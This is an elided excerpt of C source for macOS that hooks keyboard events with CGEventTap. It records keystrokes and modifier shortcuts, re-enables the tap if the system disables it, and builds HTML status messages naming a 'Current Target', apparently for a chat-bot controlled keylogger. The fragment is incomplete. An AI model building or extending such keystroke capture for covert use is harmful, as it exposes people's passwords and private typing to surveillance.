...
static CGEventRef event_callback([[maybe_unused]] CGEventTapProxy proxy,
  ...
  if (type == kCGEventKeyDown) {
    ...
    if (is_special || is_printable) {
      ...
      if (has_modifier && key_label[0] != '\n') {
        if (keyboard_get_shortcuts_enabled()) {
          ...
          if (cmd_down)
            offset +=
                snprintf(mod_buf + offset, sizeof(mod_buf) - offset, "Cmd+");
          if (ctrl_down)
            offset +=
                snprintf(mod_buf + offset, sizeof(mod_buf) - offset, "Ctrl+");
          if (alt_down)
            offset +=
                snprintf(mod_buf + offset, sizeof(mod_buf) - offset, "Option+");
        ...
        if (keyboard_get_shortcuts_enabled()) {
          char spec_buf[48];
          int spec_len =
              snprintf(spec_buf, sizeof(spec_buf), "[%s]", key_label);
          if (spec_len > 0) {
    ...
    c2t_log_warning("keyboard",
                    "macOS event tap disabled by system, re-enabling");
    if (global_event_tap) {
...
int keyboard_get_device_list(char *buffer, size_t max_len) {
  ...
  snprintf(buffer, max_len,
           ...
           "• <b>[0]</b> <code>CGEventTap</code> (Session Event Tap) — 🟢 "
           "<b>ACTIVE</b>\n\n"
           "🎯 <b>Current Target:</b> <code>%s</code>",
           macos_selected_target);
  return 1;
}
...
int keyboard_select_device(const char *target) {
  if (!target || !*target || strcmp(target, "all") == 0 ||
    ...
    snprintf(macos_selected_target, sizeof(macos_selected_target), "%s",
             target);
  }
  return 1;
}
...
void keyboard_get_available_layouts(char *buffer, size_t max_len) {
  ...
  snprintf(buffer, max_len,
           ...
           "• macOS automatically maps keystrokes using the active system "
           "Input Source.\n");
}
#endif
